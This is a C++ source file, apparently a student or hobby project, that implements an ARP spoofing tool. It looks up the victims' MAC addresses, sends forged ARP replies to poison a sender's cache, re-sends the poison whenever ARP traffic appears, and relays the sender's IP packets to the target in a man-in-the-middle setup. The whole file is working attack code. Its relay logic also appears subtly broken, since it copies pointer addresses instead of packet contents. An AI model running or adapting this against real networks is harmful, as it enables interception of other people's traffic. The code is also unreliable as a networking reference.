#include <pcap.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <netinet/in_systm.h>
#include <libnet/libnet-macros.h>
#include <libnet/libnet-headers.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>

struct libnet_ethernet_hdr ehtH;

#pragma pack(push, 1)
struct arp_hdr : public libnet_arp_hdr {
	u_int8_t sha[6];
	u_int32_t spa;
	u_int8_t tha[6];
	u_int32_t tpa;
} req, infec;

struct add {
	u_int32_t ip;
	u_int8_t mac[6];
} my, sender, target;
#pragma pack(pop)

u_int32_t netmask;

void getAttacker(char* dev) {
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
	struct ifreq s;
	strcpy(s.ifr_name, dev);

	ioctl(fd, SIOCGIFHWADDR, &s);
	memcpy(my.mac, s.ifr_hwaddr.sa_data, sizeof(s.ifr_hwaddr.sa_data));

	ioctl(fd, SIOCGIFADDR, &s);
	memcpy(&my.ip, (void*)&(((struct sockaddr_in *)&s.ifr_addr)->sin_addr), sizeof(((struct sockaddr_in *)&s.ifr_addr)->sin_addr));

	ioctl(fd, SIOCGIFNETMASK, &s);
	memcpy(&netmask, (void*)&(((struct sockaddr_in *)&s.ifr_addr)->sin_addr), sizeof(((struct sockaddr_in *)&s.ifr_addr)->sin_addr));

}

void makearp(struct arp_hdr* a, char* ti, u_int16_t arpop) {
	for(int i=0; i<6; i++) {
		ehtH.ether_dhost[i] = '\xff';
		a->sha[i] = my.mac[i];
		a->tha[i] = 0;
	}

	ehtH.ether_type = ntohs(ETHERTYPE_ARP);
	a->ar_hrd = ntohs(ARPHRD_ETHER);
	a->ar_pro = ntohs(ETHERTYPE_IP);
	a->ar_hln = 6;
	a->ar_pln = 4;
	a->ar_op = ntohs(arpop);
//	inet_pton(AF_INET, si, a->spa);
	inet_pton(AF_INET, ti, &a->tpa);
}

void makepacket(u_int8_t* packet, struct arp_hdr a) {
	memcpy(packet, &ehtH, sizeof(struct libnet_ethernet_hdr));
        memcpy(packet+sizeof(struct libnet_ethernet_hdr), &a, sizeof(struct arp_hdr));
}

/**********************************
int check_ip(u_int32_t* ip){
	u_int32_t check = (*ip & netmask);
	printf("%s\n", check);
	return 0;
}
****************/


int main(int argc, char* argv[]) {

	if (argc != 4) {
		return -1;
	}

	char* dev = argv[1];
	inet_pton(AF_INET, argv[2], &sender.ip);
	inet_pton(AF_INET, argv[3], &target.ip);

	getAttacker(dev);

	makearp(&req, argv[2], ARPOP_REQUEST);
	makearp(&infec, argv[2], ARPOP_REPLY);

	memcpy(ehtH.ether_shost, my.mac, sizeof(my.mac));
	req.spa = my.ip;
	infec.spa = target.ip;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	u_int8_t size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct arp_hdr);
	u_int8_t arppacket[size], arp_infec_packet[size];

	makepacket(arppacket, req);
	pcap_sendpacket(handle, arppacket, size);

	while (true) {
		struct pcap_pkthdr* header;
		const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;

		struct libnet_ethernet_hdr* next_ehtH = (struct libnet_ethernet_hdr *)packet;

		if(ntohs(next_ehtH->ether_type) == ETHERTYPE_ARP) {
			packet += sizeof(struct libnet_ethernet_hdr);
			struct arp_hdr* next_arpH = (struct arp_hdr *)packet;
			if(req.tpa == next_arpH->spa){
				for(int i=0; i<6; i++) {
					sender.mac[i] = next_arpH->sha[i];
					infec.tha[i] = next_arpH->sha[i];
				}
				break;
			}
		}
	}

	req.tpa = target.ip;
        makepacket(arppacket, req);
        pcap_sendpacket(handle, arppacket, size);

	while (true) {
                struct pcap_pkthdr* header;
                const u_char* packet;
                int res = pcap_next_ex(handle, &header, &packet);
                if (res == 0) continue;
                if (res == -1 || res == -2) break;

                struct libnet_ethernet_hdr* next_ehtH = (struct libnet_ethernet_hdr *)packet;

                if(ntohs(next_ehtH->ether_type) == ETHERTYPE_ARP) {
                        packet += sizeof(struct libnet_ethernet_hdr);
                        struct arp_hdr* next_arpH = (struct arp_hdr *)packet;
                        if(req.tpa == next_arpH->spa){
                                for(int i=0; i<6; i++) target.mac[i] = next_arpH->sha[i];
                                break;
                        }
                }
        }

	for(int i=0; i<6; i++) ehtH.ether_dhost[i] = infec.tha[i];

	makepacket(arp_infec_packet, infec);
	pcap_sendpacket(handle, arp_infec_packet, size);

	while(true) {
		struct pcap_pkthdr* header;
                const u_char* packet;
		int res = pcap_next_ex(handle, &header, &packet);
                if (res == 0) continue;
                if (res == -1 || res == -2) break;

		struct libnet_ethernet_hdr* next_ehtH = (struct libnet_ethernet_hdr *)packet;
		packet += sizeof(struct libnet_ethernet_hdr);

		if(ntohs(next_ehtH->ether_type)==ETHERTYPE_ARP) {
                	struct arp_hdr* next_arpH = (struct arp_hdr *)packet;
			if((next_arpH->spa == sender.ip) || (next_arpH->spa == target.ip)) pcap_sendpacket(handle, arp_infec_packet, size);
			if((next_arpH->spa != my.ip) && (next_arpH->tpa == target.ip)) pcap_sendpacket(handle, arp_infec_packet, size);
		}

		else if(ntohs(next_ehtH->ether_type)==ETHERTYPE_IP) {
			if(memcmp(next_ehtH->ether_shost, sender.mac, sizeof(sender.mac))==0) {
				struct libnet_ipv4_hdr* next_ipH = (struct libnet_ipv4_hdr *)packet;
				if(memcmp(&next_ipH->ip_src, &sender.ip, sizeof(sender.ip)) == 0) {
					memcpy(next_ehtH->ether_shost, my.mac, sizeof(my.mac));
					memcpy(next_ehtH->ether_dhost, target.mac, sizeof(target.mac));

					u_int8_t relay_packet[header->caplen];
					memcpy(relay_packet, &next_ehtH, sizeof(struct libnet_ethernet_hdr));
					memcpy(relay_packet+sizeof(struct libnet_ethernet_hdr), &packet, sizeof(packet));
					pcap_sendpacket(handle, relay_packet, header->caplen);
				}
			}
		}
	}

	pcap_close(handle);

	return 0;
}
